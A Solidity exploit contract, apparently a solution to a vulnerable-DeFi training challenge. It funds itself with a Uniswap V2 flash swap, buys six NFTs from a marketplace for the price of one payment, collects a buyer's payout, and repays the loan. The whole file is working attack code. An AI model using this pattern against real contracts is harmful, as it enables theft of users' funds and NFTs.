// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import 'hardhat/console.sol';

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata _tokenIds) external payable;
    function token() external view returns (IERC721);
}

interface IERC721 {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract FreeRiderAttacker {
    address attacker;
    IUniswapV2Pair uniswapPair;
    IWETH9 weth;
    IFreeRiderNFTMarketplace marketplace;
    IERC721 immutable nft;
    address buyer;
    
    constructor(address _uniswapPair, address _weth, address _marketplace, address _buyer) {
        attacker = msg.sender;
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = IWETH9(_weth);
        marketplace = IFreeRiderNFTMarketplace(_marketplace);
        nft = IFreeRiderNFTMarketplace(_marketplace).token();
        buyer = _buyer;
    }

    function startFlashLoan(uint256 loanAmount) external {
        // 1. take a flash loan of 15 ether
        // data.length is greater than 0, so the flash swap will be executed
        uniswapPair.swap(loanAmount, 0, address(this), "0x");
    }

    // callback for the flash swap  
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(uniswapPair), "Unauthorized");
        
        // unwrap the flash swapped WETH
        weth.withdraw(amount0);

        uint8 numberOfNFTs = 6;
        uint256[] memory tokenIds = new uint256[](numberOfNFTs);
        for (uint256 tokenId = 0; tokenId < numberOfNFTs; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        
        marketplace.buyMany{value: amount0}(tokenIds);
        
        // transfer the NFTs bought to the buyer contract 
        // this will call the `onERC721Received` function in the FreeRiderBuyer.sol and pay the attacker the `JOB_PAYOUT`
        for (uint256 tokenId = 0; tokenId < numberOfNFTs; tokenId++) {
            tokenIds[tokenId] = tokenId;
            nft.safeTransferFrom(address(this), buyer, tokenId);
        }

        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps 
        uint256 fee = (amount0 * 3 / 997) + 1;
        uint256 ethReturned = amount0 + fee;
        
        weth.deposit{ value: ethReturned }();
        
        // pay back the flash swap 
        bool success = weth.transfer(address(uniswapPair), ethReturned);
        require(success, "Transfer failed");
    }

    // Callback for ERC-721 safeTransferFrom
    // Reference: https://eips.ethereum.org/EIPS/eip-721
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return 0x150b7a02; // return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)")); 
    } 

    receive() external payable {}
}